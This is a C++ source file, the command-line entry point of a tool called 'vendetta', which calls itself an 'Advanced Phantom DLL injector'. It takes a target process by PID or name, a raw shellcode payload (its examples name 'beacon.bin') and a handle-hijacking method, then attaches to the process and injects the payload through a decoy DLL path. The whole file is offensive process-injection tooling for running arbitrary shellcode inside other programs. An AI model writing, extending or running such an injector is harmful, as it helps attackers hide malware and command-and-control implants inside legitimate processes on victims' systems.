#include "vendetta/vendetta.h"
#include <iostream>
#include <filesystem>


static void print_usage()  // NOLINT(misc-use-anonymous-namespace)
{
	std::println("Usage: vendetta.exe [TARGET] [OPTIONS] <PHANTOM_DLL_PATH>");
	std::println("");
	std::println("Target (Choose one):");
	std::println("  -pid <id>          Target process by PID");
	std::println(
		"  -proc <name>       Target process by Name (e.g., notepad.exe)");
	std::println("");
	std::println("Options:");
	std::println(
		"  -payload <path>    Path to the raw shellcode/PE-shellcode file");
	std::println(
		"  -m <method>        Handle hijacking method: 'open_handle' (default) or 'hijack_handle'");
	std::println("");
	std::println("Examples:");
	std::println(
		R"(  vendetta.exe -pid 1234 -payload shellcode.bin C:\Windows\System32\xpsservices.dll)");
	std::println(
		R"(  vendetta.exe -proc notepad.exe -payload beacon.bin -m hijack_handle C:\Windows\System32\xpsservices.dll)");
}

int main(int argc, char* argv[])
{
	std::println(
		R"(____   ____                 .___      __    __          
\   \ /   /____   ____    __| _/_____/  |__/  |______   
 \   Y   // __ \ /    \  / __ |/ __ \   __\   __\__  \  
  \     /\  ___/|   |  \/ /_/ \  ___/|  |  |  |  / __ \_
   \___/  \___  >___|  /\____ |\___  >__|  |__| (____  /
                                                     \/ 
        .------------------------------------.          
        |Advanced Phantom DLL injector v1.0.0|          
        |      Author: (wichtigerlelek)      |          
        '------------------------------------'          )");

	if (argc < 3)
	{
		print_usage();
		return 1;
	}

	// Default Config
	std::string target_identifier;
	bool target_is_pid = false;
	std::string payload_path;
	std::wstring phantom_dll_path;
	vendetta::injector::retrieve_handle_method handle_method =
		vendetta::injector::hijack_handle;

	bool has_target = false;
	bool has_phantom = false;
	bool has_payload = false;

	for (int i = 1; i < argc; ++i)
	{
		std::string_view arg = argv[i];

		if (arg == "-pid")
		{
			if (i + 1 < argc)
			{
				target_identifier = argv[++i];
				target_is_pid = true;
				has_target = true;
			}
			else
			{
				std::println("[-] Error: -pid requires an argument.");
				return 1;
			}
		}
		else if (arg == "-proc")
		{
			if (i + 1 < argc)
			{
				target_identifier = argv[++i];
				target_is_pid = false;
				has_target = true;
			}
			else
			{
				std::println("[-] Error: -proc requires an argument.");
				return 1;
			}
		}
		else if (arg == "-payload")
		{
			if (i + 1 < argc)
			{
				payload_path = argv[++i];
				has_payload = true;
			}
			else
			{
				std::println("[-] Error: -payload requires a file path.");
				return 1;
			}
		}
		else if (arg == "-m")
		{
			if (i + 1 < argc)
			{
				std::string method = argv[++i];
				if (method == "open_handle")
				{
					handle_method = vendetta::injector::open_handle;
				}
				else if (method == "hijack_handle")
				{
					handle_method = vendetta::injector::hijack_handle;
				}
				else
				{
					std::println(
						"[-] Error: Invalid method '{}'. Use 'open_handle' or 'hijack_handle'.",
						method);
					return 1;
				}
			}
			else
			{
				std::println("[-] Error: -m requires an argument.");
				return 1;
			}
		}
		else if (!arg.starts_with("-"))
		{
			std::string temp_path = argv[i];
			phantom_dll_path = std::wstring(temp_path.begin(), temp_path.end());
			has_phantom = true;
		}
		else
		{
			std::println("[-] Unknown argument: {}", arg);
			return 1;
		}
	}

	if (!has_target)
	{
		std::println("[-] Error: Target not specified. Use -pid or -proc.");
		return 1;
	}
	if (!has_phantom)
	{
		std::println("[-] Error: Phantom DLL path (decoy) not specified.");
		return 1;
	}
	if (!has_payload)
	{
		std::println(
			"[-] Error: Payload file path not specified. Use -payload <path>.");
		return 1;
	}

	if (!std::filesystem::exists(payload_path))
	{
		std::println("[-] Error: Payload file does not exist: {}",
		             payload_path);
		return 1;
	}
	if (!std::filesystem::exists(std::filesystem::path(phantom_dll_path)))
	{
		std::wcout << L"[-] Warning: Phantom DLL path might not exist on disk: "
			<< phantom_dll_path <<
			'\n';
	}

	std::println("[*] Loading payload from: {}", payload_path);
	vendetta::injector inj(payload_path);

	// Attach Phase
	if (target_is_pid)
	{
		DWORD pid = 0;
		try
		{
			pid = std::stoul(target_identifier);
		}
		catch (...)
		{
			std::println("[-] Error: Invalid PID format.");
			return 1;
		}

		if (!inj.attach_to_process(pid, handle_method))
		{
			std::println("[-] Failed to attach to PID: {}", pid);
			return 1;
		}
	}
	else
	{
		std::wstring proc_name(target_identifier.begin(),
		                       target_identifier.end());
		if (!inj.attach_to_process_by_name(proc_name, handle_method))
		{
			std::println("[-] Failed to attach to process: {}",
			             target_identifier);
			return 1;
		}
	}

	// Injection Phase
	std::wcout << L"[*] Injecting using Phantom DLL: " << phantom_dll_path <<
		'\n';

	if (!inj.inject(phantom_dll_path))
	{
		std::println("[-] Injection failed.");
		return 1;
	}

	std::println("[+] Injection completed successfully.");
	return 0;
}
